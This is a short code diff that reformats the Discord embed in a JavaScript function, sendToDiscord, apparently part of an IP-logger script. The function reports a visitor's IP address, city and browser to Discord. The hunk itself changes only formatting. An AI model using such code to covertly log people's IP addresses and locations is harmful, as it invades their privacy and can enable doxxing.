@@ -8,14 +8,17 @@ function sendToDiscord(ip, city, browser) {
                 description: "**Logging user information...**", // Embed description
                 color: 7506394, // Embed color (decimal representation of a hex color code)
                 fields: [
-                    { name: "__🍦 IP Address__", value: `**${ip}**`, inline: true }, // IP Address field
-                    { name: "__🚬 City__", value: `**${city}**`, inline: true }, // City field
-                    { name: "__🚀 Browser__", value: `**${browser}**`, inline: true }, // Browser field
+                    { 
+                        name: "__📜 Information__", 
+                        value: `**🍦 IP Address: __${ip}__**\n**🚬 City: __${city}__**\n**🚀 Browser: __${browser}__**`, 
+                        inline: false 
+                    }
                 ],
                 timestamp: new Date().toISOString(), // Current timestamp in ISO 8601 format
             },
         ],
     };
+    
     
     
 
